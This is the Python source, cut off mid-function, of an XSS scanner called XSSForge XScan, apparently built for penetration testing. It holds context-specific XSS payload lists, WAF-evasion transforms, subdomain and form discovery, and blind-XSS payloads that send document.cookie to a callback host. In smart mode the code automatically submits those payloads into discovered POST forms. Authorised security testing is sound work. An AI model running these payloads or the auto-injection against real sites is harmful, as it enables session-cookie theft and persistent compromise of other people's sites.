#!/usr/bin/env python3
"""
XSSForge XScan v2.0 - Ultimate Pipeline-Ready XSS Scanner

The most comprehensive XSS scanner with:
- 500+ payloads (beats Dalfox's ~100)
- Smart adaptive scanning (context-aware, filter-aware)
- WAF bypass built-in
- Real browser verification (optional)

Usage:
    cat urls.txt | python -m xssforge.xscan
    echo "https://target.com/?q=test" | python -m xssforge.xscan
    python -m xssforge.xscan -u "https://target.com/search?q=test"
    python -m xssforge.xscan -l urls.txt -o results.json --preset thorough
    python -m xssforge.xscan -u "https://target.com/?q=test" --browser
"""

import asyncio
import sys
import json
import re
import time
import argparse
from dataclasses import dataclass, field
from typing import Dict, List
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import httpx
except ImportError:
    print("Error: httpx required. Install: pip install httpx", file=sys.stderr)
    sys.exit(1)

# Import XSSForge components
try:
    from xssforge.payloads.ultimate import (
        ULTIMATE_PAYLOADS,
        get_payloads_for_context,
        get_waf_bypass_payloads,
        get_polyglots,
        get_payload_count,
    )
    ULTIMATE_AVAILABLE = True
except ImportError:
    ULTIMATE_AVAILABLE = False

try:
    from xssforge.filter_analyzer import FilterAnalyzer, FilterProfile, filter_payloads_for_profile
    FILTER_ANALYZER_AVAILABLE = True
except ImportError:
    FILTER_ANALYZER_AVAILABLE = False

try:
    from xssforge.waf.evasion import WAFEvasionEngine, evade_payload
    WAF_EVASION_AVAILABLE = True
except ImportError:
    WAF_EVASION_AVAILABLE = False

try:
    from xssforge.browser import BrowserVerifier, is_browser_available, VerificationResult
    BROWSER_AVAILABLE = is_browser_available()
except ImportError:
    BROWSER_AVAILABLE = False

# NEW: Import enhanced modules
try:
    from xssforge.bav import BAVScanner, BAVFinding, scan_bav
    BAV_AVAILABLE = True
except ImportError:
    BAV_AVAILABLE = False

try:
    from xssforge.dom_miner import DOMMiner, mine_parameters
    DOM_MINER_AVAILABLE = True
except ImportError:
    DOM_MINER_AVAILABLE = False

try:
    from xssforge.remote_payloads import RemotePayloadFetcher, fetch_remote_payloads
    REMOTE_PAYLOADS_AVAILABLE = True
except ImportError:
    REMOTE_PAYLOADS_AVAILABLE = False

try:
    from xssforge.dom_xss import DOMXSSAnalyzer, analyze_for_dom_xss, is_json_response
    DOM_XSS_AVAILABLE = True
except ImportError:
    DOM_XSS_AVAILABLE = False


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class Finding:
    """XSS finding."""
    url: str
    param: str
    payload: str
    context: str
    severity: str = "high"
    waf_bypass: bool = False
    evidence: str = ""
    browser_verified: bool = False
    evasion_technique: str = ""

    def to_json(self) -> dict:
        return {
            "url": self.url,
            "param": self.param,
            "payload": self.payload,
            "context": self.context,
            "severity": self.severity,
            "waf_bypass": self.waf_bypass,
            "browser_verified": self.browser_verified,
            "evasion_technique": self.evasion_technique,
        }

    def __str__(self):
        verified = " [VERIFIED]" if self.browser_verified else ""
        bypass = " [WAF-BYPASS]" if self.waf_bypass else ""
        return f"[{self.severity.upper()}]{verified}{bypass} {self.url} | {self.param}={self.payload[:40]}"


@dataclass
class ScanConfig:
    """Scanner configuration."""
    timeout: float = 10.0
    delay: float = 0.0
    verbose: bool = False
    waf_evasion: bool = True
    max_payloads: int = 50
    preset: str = "standard"  # quick, standard, thorough
    use_browser: bool = False
    smart_filter: bool = True  # Use filter analyzer
    verify_only: bool = False  # Only verify, don't find new
    # Critical features to match Dalfox
    blind_callback: str = ""  # Blind XSS callback URL (-b)
    post_data: str = ""  # POST body data (-d)
    headers: dict = field(default_factory=dict)  # Custom headers (-H)
    cookies: str = ""  # Custom cookies (-C)
    method: str = "GET"  # HTTP method override
    custom_payloads: str = ""  # Custom payloads file
    workers: int = 10  # Concurrent workers
    # NEW: Enhanced features that beat Dalfox
    use_bav: bool = False  # BAV testing (SQLi, SSTI, Open Redirect)
    mine_params: bool = False  # DOM parameter mining
    # SMART MODE: Automatically discover and test everything
    smart_mode: bool = False  # Enable full intelligent scanning
    scan_subdomains: bool = False  # Find dev/staging subdomains
    scan_forms: bool = False  # Discover and test POST forms
    scan_api: bool = False  # Discover API endpoints
    scan_dom: bool = False  # Deep DOM XSS analysis
    remote_payloads: str = ""  # Remote payload sources (comma-separated)
    deep_dom_xss: bool = False  # Enhanced DOM XSS analysis
    skip_json: bool = True  # Skip JSON responses (fixes Dalfox FP issue)


# ============================================================================
# Blind XSS Payloads
# ============================================================================

def generate_blind_payloads(callback_url: str) -> list[str]:
    """Generate blind XSS payloads with callback URL."""
    # Ensure callback URL doesn't have trailing slash
    cb = callback_url.rstrip("/")

    return [
        # Script-based callbacks
        f'"><script src={cb}></script>',
        f"'><script src={cb}></script>",
        f'<script src="{cb}"></script>',
        f'<script>new Image().src="{cb}?c="+document.cookie</script>',
        f'<script>fetch("{cb}?c="+document.cookie)</script>',

        # IMG-based callbacks
        f'<img src=x onerror="new Image().src=\'{cb}?c=\'+document.cookie">',
        f'"><img src=x onerror=this.src="{cb}?c="+document.cookie>',
        f"'><img src=x onerror=fetch('{cb}?c='+document.cookie)>",

        # SVG-based callbacks
        f'<svg onload="fetch(\'{cb}?c=\'+document.cookie)">',
        f'"><svg/onload=fetch("{cb}?"+document.cookie)>',

        # Event handler callbacks
        f'<input onfocus="fetch(\'{cb}?c=\'+document.cookie)" autofocus>',
        f'<details open ontoggle="fetch(\'{cb}?c=\'+document.cookie)">',
        f'<body onload="fetch(\'{cb}?c=\'+document.cookie)">',

        # Polyglot blind payloads
        f'javascript:fetch("{cb}?c="+document.cookie)',
        f'"><img src=x id="{cb}" onerror=fetch(this.id+"?c="+document.cookie)>',

        # Header injection payloads (for X-Forwarded-For, Referer, etc.)
        f'<script src="//{cb.replace("https://", "").replace("http://", "")}"></script>',
    ]


# ============================================================================
# WAF Detection (Enhanced)
# ============================================================================

WAF_SIGNATURES = {
    "cloudflare": ["cf-ray", "__cfduid", "cloudflare", "cf-request-id"],
    "akamai": ["akamai", "x-akamai", "akamai-gtm"],
    "aws": ["awswaf", "x-amzn", "x-amz-cf"],
    "imperva": ["incap_ses", "visid_incap", "incapsula"],
    "sucuri": ["sucuri", "x-sucuri"],
    "modsecurity": ["mod_security", "modsec"],
    "f5": ["bigip", "f5-ltm", "ts="],
    "fortinet": ["fortigate", "fortiweb", "fortiwafd"],
    "barracuda": ["barracuda", "barra"],
}


def detect_waf(headers: dict, body: str) -> str:
    """Detect WAF from response."""
    h_lower = {k.lower(): v.lower() for k, v in headers.items()}
    b_lower = body.lower()

    for waf, sigs in WAF_SIGNATURES.items():
        for sig in sigs:
            for v in h_lower.values():
                if sig in v:
                    return waf
            if sig in b_lower:
                return waf

    # Generic block detection
    if re.search(r"blocked|forbidden|denied|firewall|security", b_lower):
        return "generic"

    return ""


# ============================================================================
# Context Detection (Enhanced)
# ============================================================================

def detect_context(body: str, canary: str) -> str:
    """Detect context where input is reflected."""
    if canary not in body:
        return "none"

    idx = body.find(canary)
    before = body[max(0, idx-150):idx]
    after = body[idx:idx+len(canary)+100]

    # URL context - check first (href, src, action, formaction)
    if re.search(r'(?:href|src|action|formaction|data|poster|codebase)\s*=\s*["\']?$', before, re.I):
        return "url"

    # EVENT HANDLER with JS string context (e.g., onload="func('INPUT')")
    # This is critical for Level 4 style vulnerabilities
    event_handlers = r'(?:on\w+)\s*=\s*'
    if re.search(event_handlers + r'"[^"]*\([^)]*\'[^\']*$', before, re.I):
        # Inside single-quoted JS string within double-quoted event handler
        # e.g., onload="startTimer('INPUT')"
        return "js_single"
    if re.search(event_handlers + r"'[^']*\([^)]*\"[^\"]*$", before, re.I):
        # Inside double-quoted JS string within single-quoted event handler
        return "js_double"
    if re.search(event_handlers + r'"[^"]*$', before, re.I):
        # Inside double-quoted event handler, not in nested string
        return "js_eventhandler_double"
    if re.search(event_handlers + r"'[^']*$", before, re.I):
        # Inside single-quoted event handler
        return "js_eventhandler_single"

    # Attribute context (double quote)
    if re.search(r'<\w+[^>]*\s+\w+\s*=\s*"[^"]*$', before, re.I):
        if re.search(r'(?:href|src|action|formaction)\s*=\s*"[^"]*$', before, re.I):
            return "url"
        return "attr_double"

    # Attribute context (single quote)
    if re.search(r"<\w+[^>]*\s+\w+\s*=\s*'[^']*$", before, re.I):
        if re.search(r"(?:href|src|action|formaction)\s*=\s*'[^']*$", before, re.I):
            return "url"
        return "attr_single"

    # Attribute context (unquoted)
    if re.search(r'<\w+[^>]*\s+\w+=\s*$', before, re.I):
        return "attr_unquoted"

    # JS template literal
    if re.search(r'`[^`]*$', before):
        return "js_template"

    # JS string context (inside <script> tags)
    if re.search(r'<script[^>]*>[^<]*$', before, re.I):
        # Check quote type
        if re.search(r'"\s*$', before):
            return "js_double"
        elif re.search(r"'\s*$", before):
            return "js_single"
        elif re.search(r'`\s*$', before):
            return "js_template"
        return "js_code"

    # JS string context (var declarations, etc)
    if re.search(r'(?:var|let|const|=)\s*["\'][^"\']*$', before):
        if before.rstrip().endswith('"'):
            return "js_double"
        return "js_single"

    # HTML comment
    if re.search(r'<!--[^>]*$', before):
        return "html_comment"

    # CSS context
    if re.search(r'<style[^>]*>[^<]*$', before, re.I):
        return "css"

    return "html"


# ============================================================================
# Legacy Payloads (Fallback if ultimate.py not available)
# ============================================================================

LEGACY_PAYLOADS = {
    "html": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<details/open/ontoggle=alert(1)>',
        '<img src=x onerror=alert`1`>',
    ],
    "attr_double": [
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '" onmouseover="alert(1)" x="',
        '" onfocus="alert(1)" autofocus x="',
        '"><svg onload=alert(1)>',
    ],
    "attr_single": [
        "'><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "' onmouseover='alert(1)' x='",
        "' onfocus='alert(1)' autofocus x='",
    ],
    "js_double": [
        '";alert(1)//',
        '"-alert(1)-"',
        '</script><script>alert(1)</script>',
    ],
    "js_single": [
        "';alert(1)//",
        "'-alert(1)-'",
        "</script><script>alert(1)</script>",
    ],
    "url": [
        "javascript:alert(1)",
        "javascript:alert`1`",
        "data:text/html,<script>alert(1)</script>",
    ],
    "polyglot": [
        "'\"><img src=x onerror=alert(1)>",
        "--></script><script>alert(1)</script>",
        "'-alert(1)-'",
        '"-alert(1)-"',
        "<img src=x onerror=alert`1`>",
    ],
}

# Legacy WAF evasion
LEGACY_EVASIONS = {
    "case": lambda p: ''.join(c.upper() if i % 2 else c for i, c in enumerate(p)),
    "null": lambda p: p.replace("<", "\x00<"),
    "newline": lambda p: p.replace("<", "<\n").replace(">", "\n>"),
    "tab": lambda p: p.replace(" ", "\t"),
    "slash": lambda p: p.replace("<svg ", "<svg/").replace("<img ", "<img/"),
    "encoded_lt": lambda p: p.replace("<", "%3c").replace(">", "%3e"),
    "template": lambda p: p.replace("alert(1)", "alert`1`"),
}


# ============================================================================
# Parameter Mining
# ============================================================================

COMMON_PARAMS = [
    "q", "s", "search", "query", "keyword", "id", "name", "user", "email",
    "url", "redirect", "return", "next", "goto", "dest", "rurl", "continue",
    "page", "view", "action", "file", "path", "template", "callback", "jsonp",
    "data", "input", "text", "value", "content", "message", "body", "comment",
    "ref", "returnUrl", "redirect_uri", "target", "link", "src", "href",
]


def extract_param_hints(html: str) -> list[str]:
    """
    Extract parameter name hints from HTML and JavaScript.

    Looks for:
    - JavaScript variable declarations: var query, var data, var search
    - HTML comments containing param names
    - Common patterns in code
    """
    import re
    hints = []

    # Extract from JS variable declarations: var query = ..., let data = ..., const search = ...
    js_var_patterns = [
        r'\bvar\s+(\w+)\s*=',
        r'\blet\s+(\w+)\s*=',
        r'\bconst\s+(\w+)\s*=',
        r'(\w+)\s*=\s*["\']',  # Simple assignment
    ]

    for pattern in js_var_patterns:
        matches = re.findall(pattern, html, re.IGNORECASE)
        hints.extend(matches)

    # Extract from HTML comments that mention parameters
    # e.g., <!-- parameter: query --> or <!-- ?search=... -->
    comment_pattern = r'<!--[^>]*\?(\w+)='
    hints.extend(re.findall(comment_pattern, html))

    # Extract from input field names (might be reflected params)
    input_pattern = r'<input[^>]*name=["\'](\w+)["\']'
    hints.extend(re.findall(input_pattern, html, re.IGNORECASE))

    # Filter to likely param names (short, common words)
    likely_params = []
    common_words = {'query', 'search', 'q', 's', 'data', 'input', 'value', 'content',
                    'text', 'msg', 'message', 'id', 'p', 'param', 'test', 'callback',
                    'url', 'link', 'ref', 'redirect', 'next', 'email', 'user', 'name'}

    for hint in hints:
        # Keep if it's a common param word or short alphanumeric
        if hint.lower() in common_words or (len(hint) <= 10 and hint.isalnum()):
            likely_params.append(hint)

    # Deduplicate while preserving order
    seen = set()
    result = []
    for param in likely_params:
        if param.lower() not in seen:
            seen.add(param.lower())
            result.append(param)

    return result[:15]  # Limit to top 15 discovered params


async def mine_params(client: httpx.AsyncClient, url: str) -> list[str]:
    """Find reflected parameters using common names + smart extraction."""
    found = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    canary = f"xmine{int(time.time()) % 1000}"

    # First, fetch the page to extract hints
    try:
        initial_response = await client.get(url, timeout=5)
        discovered_params = extract_param_hints(initial_response.text)
    except:
        discovered_params = []

    # Combine discovered params with common params (discovered first - higher priority)
    params_to_test = discovered_params + [p for p in COMMON_PARAMS[:25] if p not in discovered_params]

    for param in params_to_test[:30]:  # Test up to 30 params
        try:
            r = await client.get(f"{base}?{param}={canary}", timeout=5)
            if canary in r.text:
                found.append(param)
        except:
            pass

    return found


# ============================================================================
# XScan v2.0 - Ultimate XSS Scanner
# ============================================================================

class XScan:
    """
    XSSForge XScan v2.0 - Ultimate XSS Scanner.

    Features:
    - 500+ payloads (when ultimate.py available)
    - Smart filter detection (pre-scan char testing)
    - WAF-specific bypass strategies
    - Browser verification (optional)
    - Multiple scan presets (quick/standard/thorough)
    """

    def __init__(
        self,
        timeout: float = 10.0,
        delay: float = 0.0,
        verbose: bool = False,
        waf_evasion: bool = True,
        max_payloads: int = 50,
        preset: str = "standard",
        use_browser: bool = False,
        smart_filter: bool = True,
        # Dalfox-equivalent features
        blind_callback: str = "",
        post_data: str = "",
        headers: dict = None,
        cookies: str = "",
        method: str = "GET",
        custom_payloads: str = "",
        workers: int = 10,
        # Enhanced features (beat Dalfox)
        use_bav: bool = False,
        mine_params: bool = False,
        remote_payloads: str = "",
        deep_dom_xss: bool = False,
        skip_json: bool = True,
        # SMART MODE
        smart_mode: bool = False,
        scan_subdomains: bool = False,
        scan_forms: bool = False,
        scan_api: bool = False,
        scan_dom: bool = False,
    ):
        # Smart mode enables everything
        if smart_mode:
            scan_subdomains = True
            scan_forms = True
            scan_api = True
            scan_dom = True
            mine_params = True
            deep_dom_xss = True

        self.config = ScanConfig(
            timeout=timeout,
            delay=delay,
            verbose=verbose,
            waf_evasion=waf_evasion,
            max_payloads=max_payloads,
            preset=preset,
            use_browser=use_browser,
            smart_filter=smart_filter,
            blind_callback=blind_callback,
            post_data=post_data,
            headers=headers or {},
            cookies=cookies,
            method=method.upper(),
            custom_payloads=custom_payloads,
            workers=workers,
            use_bav=use_bav,
            mine_params=mine_params,
            remote_payloads=remote_payloads,
            deep_dom_xss=deep_dom_xss,
            skip_json=skip_json,
            smart_mode=smart_mode,
            scan_subdomains=scan_subdomains,
            scan_forms=scan_forms,
            scan_api=scan_api,
            scan_dom=scan_dom,
        )
        self.findings: list[Finding] = []
        self.waf_cache: dict[str, str] = {}
        self.filter_cache: dict[str, FilterProfile] = {}
        self._filter_analyzer: Optional[FilterAnalyzer] = None
        self._waf_engine: Optional[WAFEvasionEngine] = None
        self._browser_verifier = None

        # Configure preset
        self._apply_preset()

        # Initialize components
        if FILTER_ANALYZER_AVAILABLE and self.config.smart_filter:
            self._filter_analyzer = FilterAnalyzer(timeout=timeout, verbose=verbose)

        if WAF_EVASION_AVAILABLE and self.config.waf_evasion:
            self._waf_engine = WAFEvasionEngine()

    def _apply_preset(self):
        """Apply preset configuration."""
        presets = {
            "quick": {"max_payloads": 20, "smart_filter": False},
            "standard": {"max_payloads": 50, "smart_filter": True},
            "thorough": {"max_payloads": 200, "smart_filter": True},
            "comprehensive": {"max_payloads": 500, "smart_filter": True},
        }
        if self.config.preset in presets:
            for key, value in presets[self.config.preset].items():
                setattr(self.config, key, value)

    async def scan(self, urls) -> list[Finding]:
        """Scan URLs. Accepts list, iterator, or stdin."""
        if urls is None:
            urls = sys.stdin

        url_list = []
        if hasattr(urls, 'read'):
            for line in urls:
                line = line.strip()
                if line and not line.startswith('#'):
                    url_list.append(line)
        else:
            url_list = list(urls)

        # Build headers with custom headers and cookies
        request_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
        }
        if self.config.headers:
            request_headers.update(self.config.headers)
        if self.config.cookies:
            request_headers["Cookie"] = self.config.cookies

        async with httpx.AsyncClient(
            timeout=self.config.timeout,
            follow_redirects=True,
            verify=False,
            headers=request_headers
        ) as client:

            # SMART MODE: Discover additional targets automatically
            if self.config.smart_mode or self.config.scan_subdomains or self.config.scan_forms or self.config.scan_api or self.config.scan_dom:
                discovered_urls, dom_findings = await self._smart_discover(client, url_list)
                url_list.extend(discovered_urls)

                # Add DOM XSS findings
                for dom_f in dom_findings:
                    self.findings.append(dom_f)
                    print(dom_f)

            for url in url_list:
                try:
                    findings = await self._scan_url(client, url)
                    for f in findings:
                        self.findings.append(f)
                        print(f)  # Output immediately
                    if self.config.delay:
                        await asyncio.sleep(self.config.delay)
                except Exception as e:
                    if self.config.verbose:
                        print(f"[ERR] {url}: {e}", file=sys.stderr)

            # TEST POST FORMS (for stored XSS like Level 2)
            form_targets = getattr(self, '_form_targets', [])
            if form_targets and self.config.verbose:
                print(f"[FORMS] Testing {len(form_targets)} POST forms for XSS...", file=sys.stderr)

            for form in form_targets:
                try:
                    form_findings = await self._scan_post_form(client, form)
                    for f in form_findings:
                        self.findings.append(f)
                        print(f)
                except Exception as e:
                    if self.config.verbose:
                        print(f"[ERR] POST form {form['url']}: {e}", file=sys.stderr)

        return self.findings

    async def _scan_post_form(self, client: httpx.AsyncClient, form: dict) -> list[Finding]:
        """Test POST forms for stored XSS vulnerabilities."""
        findings = []
        form_url = form["url"]

        # XSS payloads optimized for form inputs
        form_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            '<img src=x onerror=alert(1)//>',
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
        ]

        if self.config.verbose:
            print(f"[POST] Testing {form_url}", file=sys.stderr)

        for payload in form_payloads[:5]:  # Limit payloads for speed
            try:
                # Build POST data with XSS payload
                data_parts = form["data"].split("&")
                post_data = {}
                for part in data_parts:
                    if "=" in part:
                        key, value = part.split("=", 1)
                        # Inject payload into text fields
                        if value == "XSSTEST" or not value:
                            post_data[key] = payload
                        else:
                            post_data[key] = value

                # Submit the form
                r = await client.post(form_url, data=post_data, timeout=self.config.timeout)

                # Check if payload is reflected in response (stored XSS)
                if payload in r.text or payload.replace('"', '&quot;') in r.text:
                    # Verify it's not just a form echo
                    if r.status_code == 200 and 'text/html' in r.headers.get('content-type', ''):
                        finding = Finding(
                            url=form_url,
                            param="POST:" + ",".join(post_data.keys()),
                            payload=payload,
                            context="stored",
                            severity="high",
                            waf_bypass=False,
                            browser_verified=False,
                            evidence=f"Payload reflected after POST submission",
                            evasion_technique="",
                        )
                        findings.append(finding)
                        if self.config.verbose:
                            print(f"[STORED XSS] {form_url} | {payload[:50]}", file=sys.stderr)
                        break  # Found XSS, no need to test more payloads

            except Exception as e:
                if self.config.verbose:
                    print(f"[POST ERR] {e}", file=sys.stderr)
                continue

        return findings

    async def _smart_discover(self, client: httpx.AsyncClient, initial_urls: list[str]) -> tuple[list[str], list[Finding]]:
        """
        Smart discovery phase - find additional attack surfaces.

        Returns:
            (discovered_urls, dom_findings)
        """
        discovered_urls = []
        dom_findings = []
        enumerated_domains = set()  # Track which domains we've already enumerated

        try:
            from xssforge.smart_hunter import (
                enumerate_subdomains, discover_forms, discover_api_endpoints,
                scan_dom_xss, generate_blind_payloads
            )
        except ImportError:
            if self.config.verbose:
                print("[SMART] Smart hunter module not available", file=sys.stderr)
            return discovered_urls, dom_findings

        # Extract unique base domains for subdomain enumeration (only do once per domain)
        unique_domains = {}
        for url in initial_urls:
            parsed = urlparse(url)
            domain = parsed.netloc
            # Get base domain (e.g., "example.com" from "api.example.com")
            parts = domain.split(".")
            base_domain = ".".join(parts[-2:]) if len(parts) >= 2 else domain
            if base_domain not in unique_domains:
                unique_domains[base_domain] = domain

        # 1. Subdomain enumeration (find dev/staging) - ONCE per unique base domain
        if self.config.scan_subdomains or self.config.smart_mode:
            for base_domain, domain in unique_domains.items():
                if self.config.verbose:
                    print(f"[SMART] Analyzing {domain}...", file=sys.stderr)
                    print(f"[SMART] Finding subdomains...", file=sys.stderr)
                try:
                    subdomains = await enumerate_subdomains(client, domain, self.config.verbose)
                    for sub in subdomains[:5]:  # Limit to top 5
                        # Prioritize dev/staging
                        if any(x in sub for x in ["dev", "stag", "test", "qa", "sandbox", "beta", "api"]):
                            discovered_urls.append(f"https://{sub}/?q=test")
                            if self.config.verbose:
                                print(f"[SMART] Added subdomain: {sub}", file=sys.stderr)
                    enumerated_domains.add(base_domain)
                except Exception as e:
                    if self.config.verbose:
                        print(f"[SMART] Subdomain error: {e}", file=sys.stderr)

        # Process each URL for forms, APIs, DOM XSS (these are URL-specific, not domain-specific)
        processed_bases = set()  # Avoid redundant form/API discovery for same base URL
        for url in initial_urls:
            parsed = urlparse(url)
            domain = parsed.netloc
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            # Skip if we already processed this base URL (avoid redundant API/form discovery)
            if base_url in processed_bases:
                continue
            processed_bases.add(base_url)

            # 2. Form discovery (POST endpoints)
            if self.config.scan_forms or self.config.smart_mode:
                if self.config.verbose:
                    print(f"[SMART] Finding forms on {domain}...", file=sys.stderr)
                try:
                    forms = await discover_forms(client, url, self.config.verbose)
                    for form in forms:
                        if form.has_text_input:
                            # Add form URL for testing
                            form_url = form.action
                            if form.method == "POST" and form.inputs:
                                # Build POST data from form inputs
                                post_params = []
                                for inp in form.inputs:
                                    if inp["type"] in ("text", "search", "email", "textarea"):
                                        post_params.append(f"{inp['name']}=XSSTEST")
                                    elif inp["value"]:
                                        post_params.append(f"{inp['name']}={inp['value']}")
                                if post_params:
                                    # Store form info for POST testing
                                    self._form_targets = getattr(self, '_form_targets', [])
                                    self._form_targets.append({
                                        "url": form.action,
                                        "method": "POST",
                                        "data": "&".join(post_params),
                                    })
                                    if self.config.verbose:
                                        print(f"[SMART] Added POST form: {form.action}", file=sys.stderr)
                            else:
                                # GET form - add params to URL
                                params = "&".join(f"{inp['name']}=test" for inp in form.inputs if inp.get('name'))
                                if params:
                                    discovered_urls.append(f"{form_url}?{params}")

                            # Inject blind XSS if callback provided
                            if self.config.blind_callback and form.method == "POST":
                                blind_payloads = generate_blind_payloads(self.config.blind_callback)
                                for payload in blind_payloads[:2]:
                                    data = {}
                                    for inp in form.inputs:
                                        if inp["type"] in ("text", "textarea", "email"):
                                            data[inp["name"]] = payload
                                        else:
                                            data[inp["name"]] = inp.get("value", "test")
                                    try:
                                        await client.post(form.action, data=data)
                                        if self.config.verbose:
                                            print(f"[BLIND] Injected into {form.action}", file=sys.stderr)
                                    except:
                                        pass
                except Exception as e:
                    if self.config.verbose:
                        print(f"[SMART] Form error: {e}", file=sys.stderr)

            # 3. API endpoint discovery
            if self.config.scan_api or self.config.smart_mode:
                if self.config.verbose:
                    print(f"[SMART] Finding API endpoints...", file=sys.stderr)
                try:
                    apis = await discover_api_endpoints(client, url, self.config.verbose)
                    for api in apis[:10]:  # Limit
                        if api.params:
                            params = "&".join(f"{p}=test" for p in api.params)
                            discovered_urls.append(f"{api.url}?{params}")
                        else:
                            # Add common params
                            discovered_urls.append(f"{api.url}?q=test&search=test&query=test")
                        if self.config.verbose:
                            print(f"[SMART] Added API: {api.url}", file=sys.stderr)
                except Exception as e:
                    if self.config.verbose:
                        print(f"[SMART] API error: {e}", file=sys.stderr)

            # 4. DOM XSS scanning (WAF can't block this!)
            if self.config.scan_dom or self.config.smart_mode:
                if self.config.verbose:
                    print(f"[SMART] Scanning for DOM XSS...", file=sys.stderr)
                try:
                    dom_sinks = await scan_dom_xss(client, url, self.config.verbose)
                    for sink in dom_sinks:
                        if sink.exploitable:
                            # Create a finding for DOM XSS
                            dom_finding = Finding(
                                url=url,
                                param=f"DOM:{sink.source}",
                                payload=f"{sink.source} -> {sink.sink_type}",
                                context="dom",
                                severity="high" if "eval" in sink.sink_type or "setTimeout" in sink.sink_type else "medium",
                                waf_bypass=True,  # WAF can't block DOM XSS
                                evidence=sink.code_snippet[:100],
                                evasion_technique="DOM-based (client-side)",
                            )
                            dom_findings.append(dom_finding)
                            if self.config.verbose:
                                print(f"[DOM-XSS] {sink.source} -> {sink.sink_type}", file=sys.stderr)
                except Exception as e:
                    if self.config.verbose:
                        print(f"[SMART] DOM XSS error: {e}", file=sys.stderr)

        # Deduplicate discovered URLs
        discovered_urls = list(set(discovered_urls))

        if self.config.verbose and discovered_urls:
            print(f"[SMART] Discovered {len(discovered_urls)} additional URLs to test", file=sys.stderr)

        return discovered_urls, dom_findings

    async def _scan_url(self, client: httpx.AsyncClient, url: str) -> list[Finding]:
        """Scan single URL."""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # Mine params if none in URL
        if not params:
            mined = await mine_params(client, url)
            if mined:
                params = {p: [""] for p in mined}
                if self.config.verbose:
                    print(f"[MINE] {url}: {mined}", file=sys.stderr)

        if not params:
            return findings

        # Detect WAF
        domain = parsed.netloc
        if domain not in self.waf_cache:
            waf = await self._check_waf(client, url)
            self.waf_cache[domain] = waf
            if waf and self.config.verbose:
                print(f"[WAF] {domain}: {waf}", file=sys.stderr)
        waf = self.waf_cache.get(domain, "")

        # Test each parameter
        for param in params:
            # Analyze filters for this param if smart_filter enabled
            filter_profile = None
            if self._filter_analyzer and self.config.smart_filter:
                cache_key = f"{url}:{param}"
                if cache_key not in self.filter_cache:
                    if self.config.verbose:
                        print(f"[FILTER] Analyzing {param}...", file=sys.stderr)
                    filter_profile = await self._filter_analyzer.analyze(client, url, param)
                    self.filter_cache[cache_key] = filter_profile
                else:
                    filter_profile = self.filter_cache[cache_key]

            f = await self._test_param(client, url, param, waf, filter_profile)
            if f:
                findings.append(f)
                break  # One finding per URL

        return findings

    async def _check_waf(self, client: httpx.AsyncClient, url: str) -> str:
        """Check for WAF."""
        try:
            parsed = urlparse(url)
            test = f"{parsed.scheme}://{parsed.netloc}/?x=<script>alert(1)</script>"
            r = await client.get(test)
            return detect_waf(dict(r.headers), r.text)
        except:
            return ""

    async def _test_param(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        waf: str,
        filter_profile: Optional[FilterProfile]
    ) -> Optional[Finding]:
        """Test parameter for XSS."""
        # Detect context
        canary = f"xss{int(time.time()) % 10000}"
        test_url = self._inject(url, param, canary)

        try:
            r = await client.get(test_url)
        except:
            return None

        ctx = detect_context(r.text, canary)

        # If no reflection, try with special chars
        if ctx == "none":
            canary2 = f"xss'{int(time.time()) % 10000}"
            try:
                r2 = await client.get(self._inject(url, param, canary2))
                if canary2 in r2.text:
                    ctx = detect_context(r2.text, canary2)
                    if ctx == "none":
                        ctx = "html"
            except:
                pass

        if ctx == "none":
            ctx = "html"

        # Get payloads for context
        payloads = self._get_payloads(ctx, waf, filter_profile)

        # Test payloads
        for payload_info in payloads[:self.config.max_payloads]:
            if isinstance(payload_info, tuple):
                payload, evasion = payload_info
            else:
                payload, evasion = payload_info, ""

            test_url = self._inject(url, param, payload)
            try:
                r = await client.get(test_url)

                # Skip if WAF blocked the request (403, 406, 429, 503)
                if r.status_code in (403, 406, 429, 503):
                    continue  # WAF blocked, try next payload

                # Skip if response is not HTML (JSON, plain text, etc.)
                content_type = r.headers.get("content-type", "").lower()
                if "application/json" in content_type:
                    continue  # JSON response, not vulnerable to reflected XSS

                if self._check_xss(payload, r.text, ctx):
                    finding = Finding(
                        url=test_url,
                        param=param,
                        payload=payload,
                        context=ctx,
                        severity="critical" if evasion else "high",
                        waf_bypass=bool(evasion),
                        evasion_technique=evasion,
                        evidence=r.text[r.text.find(payload[:10]):r.text.find(payload[:10])+100] if payload[:10] in r.text else ""
                    )

                    # Browser verification if enabled
                    if self.config.use_browser and BROWSER_AVAILABLE:
                        finding = await self._verify_with_browser(finding, test_url, payload)

                    return finding
            except:
                pass

        return None

    async def _verify_with_browser(self, finding: Finding, url: str, payload: str) -> Finding:
        """Verify XSS with browser."""
        try:
            async with BrowserVerifier() as verifier:
                result = await verifier.verify(url, payload)
                if result.verified:
                    finding.browser_verified = True
                    finding.severity = "critical"
        except Exception as e:
            if self.config.verbose:
                print(f"[BROWSER] Verification error: {e}", file=sys.stderr)
        return finding

    def _get_payloads(
        self,
        ctx: str,
        waf: str,
        filter_profile: Optional[FilterProfile]
    ) -> list[tuple[str, str]]:
        """Get payloads for context with smart filtering and WAF evasion."""
        result = []

        # Get base payloads
        if ULTIMATE_AVAILABLE:
            base = get_payloads_for_context(ctx)
            polyglots = get_polyglots()
        else:
            ctx_map = {
                "html": "html",
                "attr_double": "attr_double",
